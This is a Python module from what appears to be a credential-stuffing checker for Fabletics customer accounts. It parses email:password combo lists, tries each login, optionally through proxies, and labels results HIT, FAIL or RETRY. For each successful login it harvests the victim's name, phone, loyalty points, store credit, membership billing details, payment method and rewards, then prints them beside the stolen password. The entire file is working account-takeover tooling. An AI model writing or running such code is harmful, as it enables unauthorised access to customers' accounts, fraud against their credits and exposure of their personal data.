from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

from .client import FableticsAPIError, FableticsClient


@dataclass
class CheckResult:
    status: str
    email: str
    password: str
    message: str = ""
    data: dict[str, Any] = field(default_factory=dict)

    def format_hit(self) -> str:
        if self.status != "HIT":
            return self.format_line()

        parts = [
            self.email,
            self.password,
            f"Name={self.data.get('name', 'N/A')}",
            f"Tier={self.data.get('loyalty_tier', 'N/A')}",
            f"Points={self.data.get('loyalty_points', 0)}",
            f"RedeemableCredits={self.data.get('eligible_credits', 0)}",
            f"MemberCredits={self.data.get('available_tokens', 0)}",
            f"StoreCredit=${self.data.get('store_credit_balance', 0):.2f}",
            f"MembershipStoreCredit=${self.data.get('membership_store_credit_balance', 0):.2f}",
            f"VIP_Savings=${self.data.get('vip_savings', 0):.2f}",
            f"Membership={self.data.get('membership_status', 'N/A')}",
            f"MonthlyPrice=${self.data.get('membership_price', 0):.2f}",
            f"NextBill={self.data.get('next_billing_date', 'N/A')}",
            f"Period={self.data.get('billing_period', 'N/A')}",
            f"Due={self.data.get('billing_due', False)}",
            f"SkipAllowed={self.data.get('skip_allowed', False)}",
            f"CartItems={self.data.get('cart_items', 0)}",
            f"Wishlist={self.data.get('wishlist_items', 0)}",
            f"ActiveRewards=${self.data.get('active_endowment_total', 0):.2f}",
            f"ActiveRewardCount={self.data.get('active_endowment_count', 0)}",
            f"DaysSinceOrder={self.data.get('days_since_last_order', 'N/A')}",
            f"MemberSince={self.data.get('member_since', 'N/A')}",
        ]
        return " | ".join(parts)

    def format_line(self) -> str:
        if self.status == "HIT":
            return self.format_hit()
        return f"{self.status} | {self.email}:{self.password} | {self.message}"


def _first(mapping: dict[str, Any], *keys: str, default: Any = None) -> Any:
    for key in keys:
        if key in mapping and mapping[key] not in (None, ""):
            return mapping[key]
    return default


def _sum_active_endowments(history: dict[str, Any]) -> tuple[float, int]:
    total = 0.0
    count = 0
    for item in history.get("historyData", []) or []:
        if str(item.get("status", "")).lower() == "active":
            amount = float(item.get("amount") or 0)
            total += amount
            count += 1
    return total, count


def capture_account_data(client: FableticsClient, token: str, login_customer: dict[str, Any]) -> dict[str, Any]:
    profile = client.get(
        "/api/accounts/me/profile",
        token,
        params={"includeEmail": "true", "includePhoneNumber": "true"},
    )
    loyalty = client.get("/api/accounts/me/loyalty/details", token)
    membership = client.get("/api/accounts/me/membership", token)
    period = client.get("/api/accounts/me/membership/period", token)
    endowment = client.get(
        "/api/accounts/me/endowment/history",
        token,
        params={"page": 1, "count": 25},
    )

    cart_items = 0
    try:
        cart = client.get("/api/cart/items/count", token)
        cart_items = int(cart.get("itemCount") or 0)
    except FableticsAPIError:
        pass

    wishlist_items = 0
    try:
        wishlist = client.get("/api/accounts/me/wishlist/ids", token)
        wishlist_items = int(wishlist.get("total") or 0)
    except FableticsAPIError:
        pass

    tier_info = (loyalty.get("tier") or [{}])[0]
    redemption_info = (loyalty.get("redemption") or [{}])[0]
    endowment_total, endowment_count = _sum_active_endowments(endowment)

    first_name = _first(profile, "firstName", default=_first(login_customer, "firstName", default=""))
    last_name = _first(profile, "lastName", default=_first(login_customer, "lastName", default=""))
    name = f"{first_name} {last_name}".strip() or "Unknown"

    return {
        "name": name,
        "email": _first(profile, "email", default=_first(login_customer, "email", default="")),
        "phone": _first(profile, "phone"),
        "customer_id": _first(profile, "id", default=_first(login_customer, "id")),
        "loyalty_tier": tier_info.get("label", "N/A"),
        "loyalty_points": loyalty.get("balance", tier_info.get("membershipTierPoints", 0)),
        "tier_points": tier_info.get("membershipTierPoints", 0),
        "points_redeemed": tier_info.get("pointsRedeemed", 0),
        "points_expired": tier_info.get("pointsExpired", 0),
        "points_to_next_tier": tier_info.get("pointsToNextTier", 0),
        "tier_promotion_date": tier_info.get("tierPromotionDate"),
        "eligible_credits": redemption_info.get("eligibleCredits", 0),
        "redemption_balance": redemption_info.get("balance", 0),
        "min_redemption_amount": redemption_info.get("minRedemptionAmount", 0),
        "purchase_point_multiplier": redemption_info.get("purchasePointMultiplier", 0),
        "available_tokens": membership.get("availableTokenQuantity", 0),
        "membership_credits": membership.get("membershipCredits", 0),
        "store_credit_balance": float(membership.get("storeCreditBalance") or 0),
        "membership_store_credit_balance": float(membership.get("membershipStoreCreditBalance") or 0),
        "vip_savings": float(_first(profile, "vipSavings", default=_first(login_customer, "vipSavings", default=0)) or 0),
        "membership_status": membership.get("statusLabel", "Unknown"),
        "membership_price": float(membership.get("price") or 0),
        "membership_type": membership.get("membershipTypeLabel") or membership.get("periodType"),
        "next_billing_date": membership.get("dateNextScheduled"),
        "billing_period": period.get("periodLabel"),
        "billing_due": period.get("isDue", False),
        "skip_allowed": period.get("skipAllowed", False),
        "bill_me_now_allowed": period.get("billMeNowAllowed", False),
        "cart_items": cart_items,
        "wishlist_items": wishlist_items,
        "active_endowment_total": endowment_total,
        "active_endowment_count": endowment_count,
        "active_endowments": [
            item
            for item in (endowment.get("historyData") or [])
            if str(item.get("status", "")).lower() == "active"
        ],
        "days_since_last_order": _first(profile, "daysSinceLastOrder", default=_first(login_customer, "daysSinceLastOrder")),
        "member_since": _first(profile, "signupDateFabletics", default=_first(login_customer, "signupDateFabletics")),
        "yitty_member_since": _first(profile, "signupDateYitty", default=_first(login_customer, "signupDateYitty")),
        "membership_id": membership.get("membershipId"),
        "membership_level_group_id": membership.get("membershipLevelGroupId"),
        "payment_method": membership.get("paymentMethod"),
        "in_free_trial": membership.get("inFreeTrial", False),
        "vip_plus_perks_available": membership.get("vipPlusPerksAvailable", False),
    }


def check_account(
    email: str,
    password: str,
    proxy: str | None = None,
    timeout: int = 30,
) -> CheckResult:
    client = FableticsClient(proxy=proxy, timeout=timeout)

    try:
        login = client.login(email, password)
        data = capture_account_data(client, login.access_token, login.customer)
        return CheckResult(status="HIT", email=email, password=password, data=data)
    except FableticsAPIError as exc:
        if exc.retryable:
            return CheckResult(
                status="RETRY",
                email=email,
                password=password,
                message=str(exc),
            )

        status_code = exc.status_code or 0
        message = str(exc).lower()

        if status_code == 403 and "authentication failed" in message:
            return CheckResult(status="FAIL", email=email, password=password, message="Invalid credentials")
        if status_code == 401:
            return CheckResult(status="RETRY", email=email, password=password, message=str(exc))

        return CheckResult(status="ERROR", email=email, password=password, message=str(exc))
    except Exception as exc:
        return CheckResult(status="ERROR", email=email, password=password, message=str(exc))


def parse_combo(line: str) -> tuple[str, str] | None:
    line = line.strip()
    if not line or line.startswith("#"):
        return None

    if ":" not in line:
        return None

    email, password = line.split(":", 1)
    email = email.strip()
    password = password.strip()
    if not email or not password:
        return None
    return email, password
